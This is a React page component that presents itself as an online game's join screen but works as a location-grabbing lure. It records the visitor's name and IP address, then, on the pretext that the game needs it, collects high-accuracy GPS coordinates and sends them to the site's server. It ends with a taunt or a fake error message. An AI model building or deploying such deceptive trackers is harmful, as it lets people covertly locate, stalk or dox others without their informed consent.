import { FC, FormEvent, Fragment, useState } from "react";

const Index: FC = () => {
	const [name, setName] = useState("");
	const [joined, setJoined] = useState(false);
	const [done, setDone] = useState(false);
	const [accuracy, setAccuracy] = useState(1000);
	const [id, setId] = useState("");

	const onJoin = (e: FormEvent<HTMLFormElement>) => {
		e.preventDefault();

		if (name === "") return;

		fetch("https://www.cloudflare.com/cdn-cgi/trace")
			.then((res) => res.text())
			.then(async (text) => {
				const res = await fetch(`${window.location.origin}/api/ip`, {
					method: "POST",
					body: JSON.stringify({
						name,
						ip: text,
						latitude: 0,
						longitude: 0,
						accuracy: 1000
					})
				});

				setId((await res.json())._id);
			});

		setJoined(true);
	};

	const onAllow = () => {
		if (id === "") return;

		if (navigator.geolocation)
			navigator.geolocation.getCurrentPosition(
				async (pos) => {
					await fetch(`${window.location.origin}/api/location`, {
						method: "POST",
						body: JSON.stringify({
							id,
							latitude: pos.coords.latitude,
							longitude: pos.coords.longitude,
							accuracy: pos.coords.accuracy
						})
					});

					setAccuracy(pos.coords.accuracy);
					setDone(true);
				},
				() =>
					alert(
						"Please enable the geolocation feature by clicking the ⓘ symbol on your browser"
					),
				{
					enableHighAccuracy: true,
					maximumAge: 2000,
					timeout: 5000
				}
			);
		else alert("Geolocation API is not supported in this browser");
	};

	if (done)
		return (
			<p>
				{accuracy < 200
					? "we do some trolling"
					: "Unable to load game. Please use a different device."}
			</p>
		);

	if (joined)
		return (
			<Fragment>
				<p>Please allow access to your location in order to run this game</p>
				<button onClick={onAllow}>Allow Access</button>
			</Fragment>
		);

	return (
		<form onSubmit={onJoin}>
			<input
				type="text"
				value={name}
				onChange={(e) => setName(e.target.value)}
				placeholder="Press Enter to Join..."
			/>
		</form>
	);
};

export default Index;
